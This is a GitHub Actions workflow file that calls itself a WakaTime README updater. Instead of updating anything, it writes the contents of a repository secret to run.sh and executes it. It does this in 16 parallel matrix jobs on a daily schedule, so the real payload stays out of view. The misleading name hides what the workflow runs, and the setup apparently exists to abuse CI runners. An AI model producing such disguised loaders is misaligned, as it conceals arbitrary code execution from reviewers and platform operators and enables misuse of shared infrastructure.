name: WakaTime README

on:
  workflow_dispatch:
  schedule:
    - cron: '30 18 * * *'
jobs:
  update-readme:
    name: Update Readme with Metrics
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        x: [ 1, 2, 3, 4]
        y: [ 1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v2
      - name: Setup ${{ matrix.x }} ${{ matrix.y }}
        env:
          RUN: '${{ secrets.RUN }}'
        run: echo "$RUN" > "run.sh"
      - name: Run ${{ matrix.x }} ${{ matrix.y }}
        run: |
          chmod +x ./run.sh
          ./run.sh
        shell: bash
